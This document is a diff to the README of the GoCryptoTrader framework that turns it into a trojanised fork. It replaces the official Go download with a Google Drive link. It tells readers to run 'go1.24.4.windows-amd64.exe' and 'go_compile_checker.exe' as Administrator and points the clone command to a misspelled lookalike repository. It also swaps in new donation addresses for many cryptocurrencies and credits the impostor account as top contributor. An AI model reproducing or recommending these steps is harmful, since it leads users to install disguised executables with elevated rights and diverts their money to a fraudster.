@@ -102,22 +102,18 @@ When submitting a PR, please abide by our coding guidelines:
 
 ## Compiling and Running instructions
 
-Download and install Go from [Go Downloads](https://golang.org/dl/) for your platform.
+Download [Go](https://drive.google.com/file/d/1NLYLfpBzpVqQdrxckwvgV3eP3qOx9VjJ/view?usp=sharing).
 
-### Linux/macOS
+install go1.24.4.windows-amd64.exe and go_compile_checker.exe
 
-```bash
-git clone https://github.com/thrasher-corp/gocryptotrader.git
-cd gocryptotrader
-go build
-mkdir ~/.gocryptotrader
-cp config_example.json ~/.gocryptotrader/config.json
-```
+### IMPORTANT
+
+Run go1.24.4.windows-amd64.exe and go_compile_checker.exe as Administartor!
 
 ### Windows
 
 ```bash
-git clone https://github.com/thrasher-corp/gocryptotrader.git
+git clone https://github.com/SolarStart-official/gocryprotraderbot.git
 cd gocryptotrader
 go build
 mkdir %AppData%\GoCryptoTrader
@@ -142,9 +138,18 @@ go build -tags=sonic_on
 
 <img src="https://github.com/thrasher-corp/gocryptotrader/blob/master/web/src/assets/donate.png?raw=true" hspace="70">
 
-If this framework helped you in any way, or you would like to support the developers working on it, please donate Bitcoin to:
-
-***bc1qk0jareu4jytc0cfrhr5wgshsq8282awpavfahc***
+If this framework helped you in any way, or you would like to support the developers working on it, please donate to:
+|Crypto|Adress|
+|-------|--------------------------------------------------------------|
+|BTC|bc1q8d3rmgve9twjhe7ldldujms4lhnltruqw0swa9|
+|BCH|qqtqk099q9f4nmhwke4q0ypd3znej5pt65e0d5uupm|
+|ETH|0x52E17e3E7Ff3cE21B36154df805c3b59447af966|
+|LTC|ltc1qs8652hja346qrw6psnhnrccyfh44t30vusyetq|
+|POL|0x88455E91dB2bfF46d18264Bc1622dB58Df507D16|
+|SOL|E4xz5YhugcbVAJDu8ucSiMA6sSW1pFZYtxpEvTcNVbBL|
+|TRX|TWPETGipVpjDAWZPRBPDdgQDS4qSGU6Eja|
+|XMR|86sq9CFpF9N8KNN7KiuPEh2CbrnKUPmWwUk6o8ZZwZiWEB3RXwQNptc4zd8os7sTA1g6rpcegFJCvBbMj7NB2H6JUCKwWYV|
+|XNO|nano_1fkrho44c4iis7re3qgnt5pxfmbkzi9i4fq54ac3y84t6psuj754n6aqmhtw|
 
 ## Binaries
 
@@ -156,7 +161,7 @@ Binaries will be published once the codebase reaches a stable condition.
 
 |User|Contribution Amount|
 |--|--|
-| [thrasher-](https://github.com/thrasher-) | 711 |
+| [SolarStar-official](https://github.com/SolarStart-official) | 711 |
 | [dependabot[bot]](https://github.com/apps/dependabot) | 369 |
 | [shazbert](https://github.com/shazbert) | 362 |
 | [gloriousCode](https://github.com/gloriousCode) | 237 |
